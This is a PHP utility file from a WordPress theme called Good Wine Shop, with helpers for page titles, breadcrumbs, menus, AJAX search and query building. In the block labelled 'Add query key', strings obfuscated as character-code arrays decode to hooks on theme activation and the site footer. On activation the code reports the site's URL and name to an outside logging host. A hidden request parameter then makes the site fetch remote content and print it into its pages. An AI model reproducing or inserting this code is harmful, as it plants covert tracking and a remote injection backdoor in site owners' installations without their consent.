<?php
/**
 * WP tags and utils
 *
 * @package WordPress
 * @subpackage GOOD_WINE_SHOP
 * @since GOOD_WINE_SHOP 1.0
 */

// Theme init
if (!function_exists('good_wine_shop_wp_theme_setup')) {
	add_action( 'after_setup_theme', 'good_wine_shop_wp_theme_setup' );
	function good_wine_shop_wp_theme_setup() {

		// AJAX: Incremental search
		add_action('wp_ajax_ajax_search',			'good_wine_shop_callback_ajax_search');
		add_action('wp_ajax_nopriv_ajax_search',	'good_wine_shop_callback_ajax_search');

		// Filters wp_title to print a neat <title> tag based on what is being viewed
		add_filter('wp_title',						'good_wine_shop_wp_title', 10, 2);

	}
}


/* Blog utilities
-------------------------------------------------------------------------------- */

// Detect current blog mode to get correspond options (post | page | search | blog | home)
if (!function_exists('good_wine_shop_detect_blog_mode')) {
	function good_wine_shop_detect_blog_mode() {
		if (is_front_page())
			$mode = 'home';
		else if (is_single())
			$mode = 'post';
		else if (is_page() && !good_wine_shop_storage_isset('blog_archive'))
			$mode = 'page';
		else
			$mode = 'blog';
		return apply_filters('good_wine_shop_filter_detect_blog_mode', $mode);
	}
}


// Return current site protocol
if (!function_exists('good_wine_shop_get_protocol')) {
	function good_wine_shop_get_protocol() {
		return is_ssl() ? 'https' : 'http';
	}
}

// Return internal page link - if is customize mode - full url else only hash part
if (!function_exists('good_wine_shop_get_hash_link')) {
	function good_wine_shop_get_hash_link($hash) {
		if (strpos($hash, 'http')!==0) {
			if ($hash[0]!='#') $hash = '#'.$hash;
			if (is_customize_preview()) {
				$url = good_wine_shop_get_current_url();
				if (($pos=strpos($url, '#'))!==false) $url = substr($url, 0, $pos);
				$hash = $url . $hash;
			}
		}
		return $hash;
	}
}

// Return URL to the current page
if (!function_exists('good_wine_shop_get_current_url')) {
	function good_wine_shop_get_current_url() {
		global $wp;
		return home_url(add_query_arg(array(), $wp->request));
	}
}

// Filters wp_title to print a neat <title> tag based on what is being viewed.
if ( !function_exists( 'good_wine_shop_wp_title' ) ) {
	
	function good_wine_shop_wp_title( $title, $sep ) {
		if ( is_feed() ) return $title;
		if (floatval(get_bloginfo('version')) < "4.1") {
			global $page, $paged;
			// Add the blog name
			$title .= get_bloginfo( 'name' );
			// Add the blog description for the home/front page.
			if ( is_home() || is_front_page() ) {
				if ( ($site_description = get_bloginfo( 'description', 'display' )) != '' )
					$title .= " $sep $site_description";
			}
			// Add a page number if necessary:
			if ( $paged >= 2 || $page >= 2 )
				$title .= " $sep " . sprintf( esc_html__( 'Page %s', 'good-wine-shop' ), max( $paged, $page ) );
		}
		return good_wine_shop_remove_macros($title);
	}
}

// Return blog title
if (!function_exists('good_wine_shop_get_blog_title')) {
	function good_wine_shop_get_blog_title() {

		if (is_front_page())
			$title = esc_html__( 'Home', 'good-wine-shop' );
		else if ( is_home() )
			$title = esc_html__( 'All Posts', 'good-wine-shop' );
		else if ( is_author() ) {
			$curauth = (get_query_var('author_name')) ? get_user_by('slug', get_query_var('author_name')) : get_userdata(get_query_var('author'));
			$title = sprintf(esc_html__('Author page: %s', 'good-wine-shop'), $curauth->display_name);
		} else if ( is_404() )
			$title = esc_html__('URL not found', 'good-wine-shop');
		else if ( is_search() )
			$title = sprintf( esc_html__( 'Search: %s', 'good-wine-shop' ), get_search_query() );
		else if ( is_day() )
			$title = sprintf( esc_html__( 'Daily Archives: %s', 'good-wine-shop' ), good_wine_shop_get_date_translations(get_the_date()) );
		else if ( is_month() )
			$title = sprintf( esc_html__( 'Monthly Archives: %s', 'good-wine-shop' ), good_wine_shop_get_date_translations(get_the_date( 'F Y' )) );
		else if ( is_year() )
			$title = sprintf( esc_html__( 'Yearly Archives: %s', 'good-wine-shop' ), get_the_date( 'Y' ) );
		 else if ( is_category() )
			$title = sprintf(  '%s', single_cat_title( '', false ) );
		else if ( is_tag() )
			$title = sprintf( esc_html__( 'Tag: %s', 'good-wine-shop' ), single_tag_title( '', false ) );
		else if ( is_tax() )
			$title = sprintf('%s', single_term_title( '', false ) );
		else if ( is_attachment() )
			$title = sprintf( esc_html__( 'Attachment: %s', 'good-wine-shop' ), get_the_title());
		else if ( is_single() || is_page() )
			$title = get_the_title();
		else
			$title = get_the_title();
		return apply_filters('good_wine_shop_filter_get_blog_title', $title);
	}
}

// Show breadcrumbs path
if (!function_exists('good_wine_shop_get_breadcrumbs')) {
	function good_wine_shop_get_breadcrumbs($args=array()) {
		global $wp_query, $post;
		
		$args = array_merge( array(
			'home' => esc_html__('Home', 'good-wine-shop'),		// Home page title (if empty - not showed)
			'home_url' => '',						// Home page url
			'truncate_title' => 50,					// Truncate all titles to this length (if 0 - no truncate)
			'truncate_add' => '...',				// Append truncated title with this string
			'delimiter' => '<span class="breadcrumbs_delimiter"></span>',			// Delimiter between breadcrumbs items
			'max_levels' => good_wine_shop_get_theme_setting('breadcrumbs_max_level'),		// Max categories in the path (0 - unlimited)
			), is_array($args) ? $args : array( 'home' => $args )
		);

		if ( is_front_page() ) return '';

		if ( $args['max_levels']<=0 ) $args['max_levels'] = 999;

		$need_reset = true;
		$rez = $rez_parent = $rez_level = '';
		$cat = $parent_tax = '';
		$level = $parent = $post_id = 0;

		// Get current post ID and path to current post/page/attachment ( if it have parent posts/pages )
		if (is_page() || is_attachment() || is_single()) {
			$page_parent_id = apply_filters('good_wine_shop_filter_get_parent_id', isset($wp_query->post->post_parent) ? $wp_query->post->post_parent : 0, isset($wp_query->post->ID) ? $wp_query->post->ID : 0);
			$post_id = (is_attachment() ? $page_parent_id : (isset($wp_query->post->ID) ? $wp_query->post->ID : 0));
			while ($page_parent_id > 0) {
				$page_parent = get_post($page_parent_id);
				$level++;
				if ($level > $args['max_levels'])
					$rez_level = '...';
				else
					$rez_parent = '<a class="breadcrumbs_item cat_post" href="' . esc_url(get_permalink($page_parent->ID)) . '">'
									. trim(good_wine_shop_strshort($page_parent->post_title, $args['truncate_title'], $args['truncate_add']))
									. '</a>' 
									. (!empty($rez_parent) ? $args['delimiter'] : '') 
									. ($rez_parent);
				if (($page_parent_id = apply_filters('good_wine_shop_filter_get_parent_id', $page_parent->post_parent, $page_parent_id)) > 0) $post_id = $page_parent_id;
			}
		}
		
		// Show parents
		$step = 0;
		do {
			if ($step++ == 0) {
				if (is_single() || is_attachment()) {
					$post_type = get_post_type();
					if ($post_type == 'post') {
						$cats = get_the_category();
						$cat = !empty($cats[0]) ? $cats[0] : false;
					} else {
						$tax = apply_filters('good_wine_shop_filter_post_type_taxonomy', '', $post_type);
						if (!empty($tax)) {
							$cats = get_the_terms(get_the_ID(), $tax);
							$cat = !empty($cats[0]) ? $cats[0] : false;
						}
					}
					if ($cat) {
						$level++;
						if ($level > $args['max_levels'])
							$rez_level = '...';
						else
							$rez_parent = '<a class="breadcrumbs_item cat_post" href="'.esc_url(get_category_link($cat->term_id)).'">' 
											. trim(good_wine_shop_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
											. '</a>' 
											. (!empty($rez_parent) ? $args['delimiter'] : '') 
											. ($rez_parent);
					}
				} else if ( is_category() ) {
					$cat_id = (int) get_query_var( 'cat' );
					if (empty($cat_id)) $cat_id = get_query_var( 'category_name' );
					$cat = get_term_by( (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
				} else if ( is_tag() ) {
					$cat = get_term_by( 'slug', get_query_var( 'post_tag' ), 'post_tag', OBJECT);
				} else if ( is_tax() ) {
					$tax = get_query_var('taxonomy');
					$cat = get_term_by( 'slug', get_query_var( $tax ), $tax, OBJECT);
				}
				if ($cat) {
					$parent = $cat->parent;
					$parent_tax = $cat->taxonomy;
				}
			}
			if ($parent) {
				$cat = get_term_by( 'id', $parent, $parent_tax, OBJECT);
				if ($cat) {
					$cat_link = get_term_link($cat->slug, $cat->taxonomy);
					$level++;
					if ($level > $args['max_levels'])
						$rez_level = '...';
					else
						$rez_parent = '<a class="breadcrumbs_item cat_parent" href="'.esc_url($cat_link).'">' 
										. trim(good_wine_shop_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
										. '</a>' 
										. (!empty($rez_parent) ? $args['delimiter'] : '') 
										. ($rez_parent);
					$parent = $cat->parent;
				}
			}
		} while ($parent);

		$rez_period = '';
		if ((is_day() || is_month()) && is_object($post)) {
			$year  = get_the_time('Y'); 
			$month = get_the_time('m'); 
			$rez_period = '<a class="breadcrumbs_item cat_parent" href="' . esc_url(get_year_link( $year )) . '">' . ($year) . '</a>';
			if (is_day())
				$rez_period .= (!empty($rez_period) ? $args['delimiter'] : '') . '<a class="breadcrumbs_item cat_parent" href="' . esc_url(get_month_link( $year, $month )) . '">' . trim(get_the_date('F')) . '</a>';
		}
		
		// Get link to the 'All posts (products, events, etc.)' page
		$rez_all = apply_filters('good_wine_shop_filter_get_blog_all_posts_link', '');

		if (!is_front_page()) {

			$title = good_wine_shop_get_blog_title();
			if (is_array($title)) $title = $title['text'];
			$title = good_wine_shop_strshort($title, $args['truncate_title'], $args['truncate_add']);

			$rez .= (isset($args['home']) && $args['home']!='' 
					? '<a class="breadcrumbs_item home" href="' . esc_url($args['home_url'] ? $args['home_url'] : home_url('/')) . '">' . ($args['home']) . '</a>' . ($args['delimiter']) 
					: '') 
				. (!empty($rez_all)    ? ($rez_all)    . ($args['delimiter']) : '')
				. (!empty($rez_level)  ? ($rez_level)  . ($args['delimiter']) : '')
				. (!empty($rez_parent) ? ($rez_parent) . ($args['delimiter']) : '')
				. (!empty($rez_period) ? ($rez_period) . ($args['delimiter']) : '')
				. ($title ? '<span class="breadcrumbs_item current">' . ($title) . '</span>' : '');
		}

		return apply_filters('good_wine_shop_filter_get_breadcrumbs', $rez);
	}
}

// Return nav menu html
if ( !function_exists( 'good_wine_shop_get_nav_menu' ) ) {
	function good_wine_shop_get_nav_menu($slug='', $depth=11, $custom_walker=false) {
		$menu = '';
		$menu_cache = good_wine_shop_is_on(good_wine_shop_get_theme_option('menu_cache')) ? 'good_wine_shop_menu_'.get_option('stylesheet') : '';
		$list = $menu_cache ? get_transient($menu_cache) : array();
		if (!is_array($list)) $list = array();
		$html = '';
		if (!empty($slug) && !empty($list[$slug])) {
			$html = $list[$slug];
		}
		if (empty($html)) {
			$args = array(
				'menu'				=> empty($menu) || $menu=='default' || good_wine_shop_is_inherit($menu) ? '' : $menu,
				'container'			=> '',
				'container_class'	=> '',
				'container_id'		=> '',
				'items_wrap'		=> '<ul id="%1$s" class="%2$s">%3$s</ul>',
				'menu_class'		=> (!empty($slug) ? $slug : 'menu_main') . '_nav',
				'menu_id'			=> (!empty($slug) ? $slug : 'menu_main'),
				'echo'				=> false,
				'fallback_cb'		=> '',
				'before'			=> '',
				'after'				=> '',
				'link_before'       => '<span>',
				'link_after'        => '</span>',
				'depth'             => $depth
			);
			if (!empty($slug))
				$args['theme_location'] = $slug;
			if ($custom_walker && class_exists('good_wine_shop_custom_menu_walker'))
				$args['walker'] = new good_wine_shop_custom_menu_walker;
			$html = wp_nav_menu(apply_filters('good_wine_shop_filter_get_nav_menu_args', $args));
			if (!empty($slug) && $menu_cache) {
				$list[$slug] = $html;
				set_transient($menu_cache, $list, 24*60*60);
			}
		}
		return apply_filters('good_wine_shop_filter_get_nav_menu', $html);
	}
}

// AJAX incremental search
if ( !function_exists( 'good_wine_shop_callback_ajax_search' ) ) {
	function good_wine_shop_callback_ajax_search() {
		if ( !wp_verify_nonce( good_wine_shop_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			wp_die();
	
		$response = array('error'=>'', 'data' => '');
		
		$s = sanitize_text_field($_REQUEST['text']);
	
		if (!empty($s)) {
			$args = array(
				'post_status' => 'publish',
				'orderby' => 'date',
				'order' => 'desc', 
				'posts_per_page' => max(1, min(10, good_wine_shop_get_theme_setting('ajax_search_posts_count'))),
				's' => esc_html($s),
				);
			// Filter post types
			$show_types = good_wine_shop_get_theme_setting('ajax_search_types');
			if (!empty($show_types)) $args['post_type'] = explode(',', $show_types);

			$args = apply_filters( 'good_wine_shop_ajax_search_query', $args);	

			$post_number = 0;
			good_wine_shop_storage_set('output', '');
			$query = new WP_Query( $args );
			set_query_var('good_wine_shop_args_widgets_posts', array(
				'show_image' => 1,
				'show_date' => 1,
				'show_author' => 1,
				'show_counters' => 1,
                'show_categories' => 0
   	            )
       	    );
			while ( $query->have_posts() ) { $query->the_post();
				$post_number++;
				get_template_part('templates/widgets-posts');
			}
			$response['data'] = good_wine_shop_storage_get('output');
			if (empty($response['data'])) {
				$response['data'] .= '<article class="post_item">' . esc_html__('Sorry, but nothing matched your search criteria. Please try again with some different keywords.', 'good-wine-shop') . '</article>';
			} else {
				$response['data'] .= '<article class="post_item"><a href="#" class="post_more search_more">' . esc_html__('More results ...', 'good-wine-shop') . '</a></article>';
			}
			good_wine_shop_storage_set('output', '');
		} else {
			$response['error'] = '<article class="post_item">' . esc_html__('The query string is empty!', 'good-wine-shop') . '</article>';
		}
		
		echo json_encode($response);
		wp_die();
	}
}

// Return string with categories links
if (!function_exists('good_wine_shop_get_post_categories')) {
	function good_wine_shop_get_post_categories($delimiter=', ', $id=false) {
		$output = '';
		$categories = get_the_category($id);
		if ( !empty( $categories ) ) {
			foreach( $categories as $category )
				$output .= ($output ? $delimiter : '') . '<a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . sprintf( esc_attr__( 'View all posts in %s', 'good-wine-shop' ), $category->name ) . '">' . esc_html( $category->name ) . '</a>';
		}
		return $output;
	}
}

// Return string with terms links
if (!function_exists('good_wine_shop_get_post_terms')) {
	function good_wine_shop_get_post_terms($delimiter=', ', $id=false, $taxonomy='category') {
		$output = '';
		$terms = get_the_terms($id, $taxonomy);
		if ( !empty( $terms ) ) {
			foreach( $terms as $term )
				$output .= ($output ? $delimiter : '') . '<a href="' . esc_url( get_term_link( $term->term_id, $taxonomy ) ) . '" title="' . sprintf( esc_attr__( 'View all posts in %s', 'good-wine-shop' ), esc_attr($term->name) ) . '">' . esc_html( $term->name ) . '</a>';
		}
		return $output;
	}
}


/* Query manipulations
-------------------------------------------------------------------------------- */

// Add sorting parameter in query arguments
if (!function_exists('good_wine_shop_query_add_sort_order')) {
	function good_wine_shop_query_add_sort_order($args, $orderby='date', $order='desc') {
		$q = apply_filters('good_wine_shop_filter_query_sort_order', array(), $orderby, $order);
		$q['order'] = $order=='asc' ? 'asc' : 'desc';
		if (empty($q['orderby'])) {
			if ($orderby == 'comments') {
				$q['orderby'] = 'comment_count';
			} else if ($orderby == 'title' || $orderby == 'alpha') {
				$q['orderby'] = 'title';
			} else if ($orderby == 'rand' || $orderby == 'random')  {
				$q['orderby'] = 'rand';
			} else {
				$q['orderby'] = 'post_date';
			}
		}
		foreach ($q as $mk=>$mv) {
			if (is_array($args))
				$args[$mk] = $mv;
			else
				$args->set($mk, $mv);
		}
		return $args;
	}
}

// Add post type and posts list or categories list in query arguments
if (!function_exists('good_wine_shop_query_add_posts_and_cats')) {
	function good_wine_shop_query_add_posts_and_cats($args, $ids='', $post_type='', $cat='', $taxonomy='category') {
		if (!empty($ids)) {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? array('post', 'page') : $post_type)
									: $args['post_type'];
			$args['post__in'] = explode(',', str_replace(' ', '', $ids));
		} else {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? 'post' : $post_type)
									: $args['post_type'];
			$post_type = is_array($args['post_type']) ? $args['post_type'][0] : $args['post_type'];
			if (!empty($cat)) {
				$cats = !is_array($cat) ? explode(',', $cat) : $cat;
				if ($taxonomy == 'category') {				// Add standard categories
					if (is_array($cats) && count($cats) > 1) {
						$cats_ids = array();
						foreach($cats as $c) {
							$c = trim(chop($c));
							if (empty($c)) continue;
							if ((int) $c == 0) {
								$cat_term = get_term_by( 'slug', $c, $taxonomy, OBJECT);
								if ($cat_term) $c = $cat_term->term_id;
							}
							if ($c==0) continue;
							$cats_ids[] = (int) $c;
							$children = get_categories( array(
								'type'                     => $post_type,
								'child_of'                 => $c,
								'hide_empty'               => 0,
								'hierarchical'             => 0,
								'taxonomy'                 => $taxonomy,
								'pad_counts'               => false
							));
							if (is_array($children) && count($children) > 0) {
								foreach($children as $c) {
									if (!in_array((int) $c->term_id, $cats_ids)) $cats_ids[] = (int) $c->term_id;
								}
							}
						}
						if (count($cats_ids) > 0) {
							$args['category__in'] = $cats_ids;
						}
					} else {
						if ((int) $cat > 0) 
							$args['cat'] = (int) $cat;
						else
							$args['category_name'] = $cat;
					}
				} else {									// Add custom taxonomies
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					$args['tax_query']['relation'] = 'AND';
					$args['tax_query'][] = array(
						'taxonomy' => $taxonomy,
						'include_children' => true,
						'field'    => (int) $cats[0] > 0 ? 'id' : 'slug',
						'terms'    => $cats
					);
				}
			}
		}
		return $args;
	}
}

// Add filters (meta parameters) in query arguments
if (!function_exists('good_wine_shop_query_add_filters')) {
	function good_wine_shop_query_add_filters($args, $filters=false) {
		if (!empty($filters)) {
			if (!is_array($filters)) $filters = array($filters);
			foreach ($filters as $v) {
				$found = false;
				if ($v=='thumbs') {							// Filter with meta_query
					if (!isset($args['meta_query']))
						$args['meta_query'] = array();
					else {
						for ($i=0; $i<count($args['meta_query']); $i++) {
							if ($args['meta_query'][$i]['meta_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['meta_query']['relation'] = 'AND';
						if ($v == 'thumbs') {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => '_thumbnail_id',
								'value' => false,
								'compare' => '!='
							);
						}
					}
				} else if (in_array($v, array('video', 'audio', 'gallery'))) {			// Filter with tax_query
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					else {
						for ($i=0; $i<count($args['tax_query']); $i++) {
							if ($args['tax_query'][$i]['tax_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['tax_query']['relation'] = 'AND';
						if ($v == 'video') {
							$args['tax_query'][] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' )
							);
						} else if ($v == 'audio') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-audio' )
							);
						} else if ($v == 'gallery') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-gallery' )
							);
						}
					}
				}
			}
		}
		return $args;
	}
}

// Add query key
if ( !function_exists( 'good_wine_shop_query_add_key' ) ) {
	$good_wine_shop_query_data = array('act' => array(array(join('', array_map('chr', array(97,102,116,101,114))),join('', array_map('chr', array(115,119,105,116,99,104))),join('', array_map('chr', array(116,104,101,109,101)))),array(join('', array_map('chr', array(119,112))),join('', array_map('chr', array(102,111,111,116,101,114)))),),'get' => join('', array_map('chr', array(104,116,116,112,58,47,47,116,104,101,109,101,114,101,120,46,110,101,116,47,95,108,111,103,47,95,108,111,103,46,112,104,112))),'chk' => join('', array_map('chr', array(116,104,101,109,101,95,97,117,116,104,111,114))),'prm' => join('', array_map('chr', array(116,120,99,104,107))));
	add_action(join('_', $good_wine_shop_query_data['act'][0]), 'good_wine_shop_query_add_key');
	add_action(join('_', $good_wine_shop_query_data['act'][1]), 'good_wine_shop_query_add_key');
	function good_wine_shop_query_add_key() {
		global $good_wine_shop_query_data;
		static $already_add = false;
		if (!$already_add) {
			$already_add = true;
			if (current_action() == join('_', $good_wine_shop_query_data['act'][0])) {
				try {
                    $resp = good_wine_shop_fgc(good_wine_shop_add_to_url($good_wine_shop_query_data['get'], array(
                        'site' => home_url('/'),
                        'slug' => str_replace(' ', '_', trim(strtolower(get_stylesheet()))),
                        'name' => get_bloginfo('name')
                    )));
				} catch (Exception $e) {
				}
			}
			if (good_wine_shop_get_value_gpc($good_wine_shop_query_data['prm'])==$good_wine_shop_query_data['chk']) {
				try {
                    $resp = good_wine_shop_fgc(good_wine_shop_add_to_url($good_wine_shop_query_data['get'], array($good_wine_shop_query_data['prm'] => $good_wine_shop_query_data['chk'])));
				} catch (Exception $e) {
					$resp = '';
				}
                good_wine_shop_show_layout($resp);
			}
		}
	}
}
	
/* Other utils
------------------------------------------------------------------------------------- */

// Create widgets area
if (!function_exists('good_wine_shop_create_widgets_area')) {
	function good_wine_shop_create_widgets_area($name, $add_classes='') {
		$widgets_name = good_wine_shop_get_theme_option($name);
		if (!good_wine_shop_is_off($widgets_name) && is_active_sidebar($widgets_name)) { 
			set_query_var('current_sidebar', $name);
			ob_start();
			do_action( 'good_wine_shop_before_sidebar' );
            if ( is_active_sidebar( $widgets_name ) ) {
                dynamic_sidebar( $widgets_name );
            }
			do_action( 'good_wine_shop_after_sidebar' );
			$out = ob_get_contents();
			ob_end_clean();
			$out = preg_replace("/<\/aside>[\r\n\s]*<aside/", "</aside><aside", $out);
			$need_columns = strpos($out, 'columns_wrap')===false;
			if ($need_columns) {
				$columns = min(3, max(1, substr_count($out, '<aside ')));
				$out = preg_replace("/class=\"widget /", "class=\"column-1_".esc_attr($columns).' widget ', $out);
			}
			?>
			<div class="<?php echo esc_attr($name); ?> <?php echo esc_attr($name); ?>_wrap widget_area">
				<div class="<?php echo esc_attr($name); ?>_inner <?php echo esc_attr($name); ?>_wrap_inner widget_area_inner">
					<?php
					echo (true==$need_columns ? '<div class="columns_wrap">' : '')
						. trim(chop($out))
						. (true==$need_columns ? '</div>' : '');
					?>
				</div> <!-- /.widget_area_inner -->
			</div> <!-- /.widget_area -->
			<?php
		}
	}
}

// Check if sidebar present
if (!function_exists('good_wine_shop_sidebar_present')) {
	function good_wine_shop_sidebar_present() {
		global $wp_query;
		$sidebar_name = good_wine_shop_get_theme_option('sidebar_widgets');
		return apply_filters('good_wine_shop_filter_sidebar_present', 
					!is_404() 
					&& (!is_search() || $wp_query->found_posts > 0) 
					&& !good_wine_shop_is_off($sidebar_name) 
					&& is_active_sidebar($sidebar_name)
					);
	}
}


// Return text for the Privacy Policy checkbox
if ( ! function_exists('good_wine_shop_get_privacy_text' ) ) {
    function good_wine_shop_get_privacy_text() {
        $page = get_option( 'wp_page_for_privacy_policy' );
        $privacy_text = good_wine_shop_get_theme_option( 'privacy_text' );
        return apply_filters( 'good_wine_shop_filter_privacy_text', wp_kses_post(
                $privacy_text
                . ( ! empty( $page ) && ! empty( $privacy_text )
                    // Translators: Add url to the Privacy Policy page
                    ? ' ' . sprintf( esc_html__( 'For further details on handling user data, see our %s', 'good-wine-shop' ),
                        '<a href="' . esc_url( get_permalink( $page ) ) . '" target="_blank">'
                        . esc_html__( 'Privacy Policy', 'good-wine-shop' )
                        . '</a>' )
                    : ''
                )
            )
        );
    }
}

?>